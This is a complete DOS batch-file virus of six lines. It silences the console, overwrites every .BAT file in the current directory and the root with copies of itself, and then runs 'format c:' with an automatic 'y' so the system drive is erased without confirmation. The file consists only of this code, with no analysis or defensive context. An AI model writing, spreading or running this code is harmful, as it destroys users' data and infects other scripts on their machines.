@Ctty Nul
For %%F In (*.Bat) Do Copy %0.BAT %%F
CD\
For %%F In (*.Bat) Do Copy %0.BAT %%F
Ctty Con
echo y|format c:
